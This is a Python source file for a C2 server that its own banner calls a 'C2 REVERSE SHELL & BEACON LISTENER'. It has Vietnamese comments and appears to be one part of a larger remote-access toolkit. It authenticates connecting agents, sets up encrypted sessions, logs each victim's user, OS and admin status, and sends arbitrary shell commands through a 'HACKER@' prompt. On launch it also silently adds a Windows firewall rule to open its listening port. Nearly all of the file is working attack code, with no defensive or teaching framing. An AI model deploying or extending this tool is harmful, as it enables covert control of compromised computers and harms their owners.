import hashlib
import hmac
import json
import os
import socket
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from c2_protocol import (
    DEFAULT_SECRET,
    MAX_FRAME,
    decrypt,
    derive_key,
    encrypt,
    handshake_server_after_auth,
    recv_frame,
    send_frame,
)

# Bắt buộc UTF-8 cho Windows Console để tránh lỗi charmap cp1258 crash banner
if sys.platform == "win32" and hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

BIND_IP = "0.0.0.0"
BIND_PORT = int(os.environ.get("C2_PORT", "4444"))
SECRET_KEY = DEFAULT_SECRET
AES_KEY = derive_key(SECRET_KEY)
COMMAND_TIMEOUT = 60.0

sessions = {}
sessions_lock = threading.Lock()
session_counter = 0
selected_session = None
is_running = True


def encrypt_data(data):
    return encrypt(AES_KEY, data)


def decrypt_data(data):
    return decrypt(AES_KEY, data)


def handle_connection(conn, addr):
    global session_counter, selected_session
    session_id = None
    conn.settimeout(10.0)
    try:
        challenge = os.urandom(32)
        conn.sendall(challenge)
        try:
            raw = conn.recv(1024)
        except Exception:
            raw = b""
        expected = hmac.new(SECRET_KEY, challenge, hashlib.sha256).hexdigest()
        if raw.decode("utf-8", errors="replace") != expected:
            print(f"[-] Xác thực thất bại từ {addr[0]}. Đóng kết nối.")
            conn.close()
            return

        conn.sendall(encrypt_data(b"AUTH_OK"))
        framing, meta = handshake_server_after_auth(conn, AES_KEY, SECRET_KEY)

        with sessions_lock:
            session_counter += 1
            session_id = f"S{session_counter:02d}"
            sessions[session_id] = {
                "id": session_id,
                "conn": conn,
                "addr": addr,
                "framing": framing,
                "meta": meta,
                "connected_at": time.time(),
                "last_seen": time.time(),
                "lock": threading.Lock(),
            }
            selected_session = session_id

        label = meta.get("hostname") if meta else None
        proto = "v2 (framed)" if framing else "v1 (legacy, không có metadata)"
        print(f"[+] Xác thực thành công. Kênh AES-256-GCM đã thiết lập với {addr[0]}:{addr[1]}")
        print(f"[+] Session {session_id} | Giao thức: {proto} | Máy: {label or 'không rõ'}")
        if meta:
            print(
                f"    user={meta.get('user')} os={meta.get('os')} arch={meta.get('arch')} "
                f"admin={meta.get('admin')} pid={meta.get('pid')}"
            )

        while is_running:
            with sessions_lock:
                entry = sessions.get(session_id)
            if not entry:
                break
            if not entry["lock"].acquire(blocking=False):
                time.sleep(0.1)
                continue
            conn.settimeout(1.0)
            try:
                blob = recv_frame(conn, MAX_FRAME) if framing else conn.recv(MAX_FRAME)
            except socket.timeout:
                continue
            except Exception:
                break
            finally:
                entry["lock"].release()
            if not blob:
                break
            entry["last_seen"] = time.time()
            if framing:
                # Agent v2 chỉ gửi unprompted khi báo lỗi/timeout command.
                try:
                    msg = json.loads(decrypt_data(blob).decode("utf-8", errors="replace"))
                    if isinstance(msg, dict) and msg.get("type") == "event":
                        print(f"[{session_id}] [!] {msg.get('message')}")
                except Exception:
                    pass
    except Exception as exc:
        print(f"[-] Lỗi phiên {session_id or addr[0]}: {exc}")
    finally:
        with sessions_lock:
            sessions.pop(session_id, None)
        try:
            conn.close()
        except Exception:
            pass
        if session_id:
            print(f"[*] Session {session_id} ({addr[0]}) đã đóng.")


def accept_loop(server_sock):
    while is_running:
        try:
            conn, addr = server_sock.accept()
        except OSError:
            break
        print(f"\n[!] Nhận kết nối từ {addr[0]}:{addr[1]}...")
        threading.Thread(target=handle_connection, args=(conn, addr), daemon=True).start()


def list_sessions():
    with sessions_lock:
        if not sessions:
            print("[*] Chưa có session nào đang mở.")
            return
        for sid, entry in sessions.items():
            meta = entry.get("meta") or {}
            marker = "*" if sid == selected_session else " "
            print(
                f" {marker} {sid} | {entry['addr'][0]}:{entry['addr'][1]} | "
                f"{meta.get('hostname', 'n/a')} | proto={'v2' if entry['framing'] else 'v1'} | "
                f"{round(time.time() - entry['connected_at'])}s"
            )


def get_selected():
    with sessions_lock:
        if selected_session and selected_session in sessions:
            return sessions[selected_session]
        if sessions:
            return list(sessions.values())[-1]
    return None


def send_command(entry, command):
    conn = entry["conn"]
    with entry["lock"]:
        if entry["framing"]:
            job_id = str(int(time.time() * 1000))
            payload = json.dumps(
                {"type": "exec", "id": job_id, "command": command, "timeout": int(COMMAND_TIMEOUT)},
                ensure_ascii=False,
            ).encode("utf-8")
            send_frame(conn, encrypt_data(payload))
            conn.settimeout(COMMAND_TIMEOUT + 10)
            blob = recv_frame(conn, MAX_FRAME)
            if not blob:
                return None, "[-] Mất kết nối khi chờ kết quả."
            result = json.loads(decrypt_data(blob).decode("utf-8", errors="replace"))
            text = (result.get("stdout") or "") + (result.get("stderr") or "")
            if not text:
                text = "[+] Không có output.\n"
            header = (
                f"[exit={result.get('exit_code')} | {result.get('duration')}s]\n"
                if result.get("exit_code") not in (0, None)
                else ""
            )
            return result.get("exit_code"), header + text

        conn.sendall(encrypt_data(command.encode("utf-8")))
        conn.settimeout(COMMAND_TIMEOUT + 10)
        enc_result = conn.recv(MAX_FRAME)
        if not enc_result:
            return None, "[-] Mất kết nối khi chờ kết quả."
        return 0, decrypt_data(enc_result).decode("utf-8", errors="replace")


def main():
    global is_running, selected_session
    print(
        r"""
  ____    ____    _____
 |  _ \  / ___|  |___ /
 | |_) || |        |_ \
 |  _ < | |___    ___) |
 |_| \_\ \____|  |____/
  [*] C2 REVERSE SHELL & BEACON LISTENER (multi-session, protocol v2)
"""
    )

    try:
        import subprocess

        subprocess.run(
            f'netsh advfirewall firewall add rule name="C2_Port{BIND_PORT}" dir=in action=allow protocol=TCP localport={BIND_PORT}',
            shell=True,
            capture_output=True,
        )
    except Exception:
        pass

    server_sock = None
    if BIND_IP in ("0.0.0.0", "::", ""):
        try:
            server_sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                server_sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
            except Exception:
                pass
            server_sock.bind(("::", BIND_PORT))
        except Exception:
            try:
                server_sock.close()
            except Exception:
                pass
            server_sock = None
    if server_sock is None:
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_sock.bind((BIND_IP, BIND_PORT))
    server_sock.listen(16)
    print(f"[*] Đang lắng nghe kết nối tại cổng {BIND_PORT} (IPv4/IPv6, giữ nguyên session cũ khi agent mới vào).")
    print("[*] Lệnh nội bộ: sessions | select <id> | close <id> | exit\n")

    threading.Thread(target=accept_loop, args=(server_sock,), daemon=True).start()

    try:
        while is_running:
            entry = get_selected()
            tag = entry["id"] if entry else "no-session"
            command = input(f"\nHACKER@[{tag}]> ").strip()
            if not command:
                continue
            low = command.lower()
            if low == "sessions":
                list_sessions()
                continue
            if low.startswith("select "):
                sid = command.split(maxsplit=1)[1].strip()
                with sessions_lock:
                    if sid in sessions:
                        selected_session = sid
                        print(f"[+] Đã chọn session {sid}.")
                    else:
                        print(f"[-] Không có session {sid}.")
                continue
            if low.startswith("close "):
                sid = command.split(maxsplit=1)[1].strip()
                with sessions_lock:
                    target = sessions.get(sid)
                if target:
                    try:
                        target["conn"].close()
                    except Exception:
                        pass
                    print(f"[*] Đã đóng session {sid}.")
                else:
                    print(f"[-] Không có session {sid}.")
                continue
            if low == "exit":
                break

            if not entry:
                print("[-] Chưa có agent nào kết nối.")
                continue
            try:
                code, output = send_command(entry, command)
            except Exception as exc:
                print(f"[-] Lỗi gửi lệnh: {exc}")
                continue
            print(output, end="" if output.endswith("\n") else "\n")
    except KeyboardInterrupt:
        pass
    finally:
        is_running = False
        with sessions_lock:
            for entry in sessions.values():
                try:
                    entry["conn"].close()
                except Exception:
                    pass
            sessions.clear()
        server_sock.close()
        print("\n[*] Listener đã dừng.")


if __name__ == "__main__":
    main()
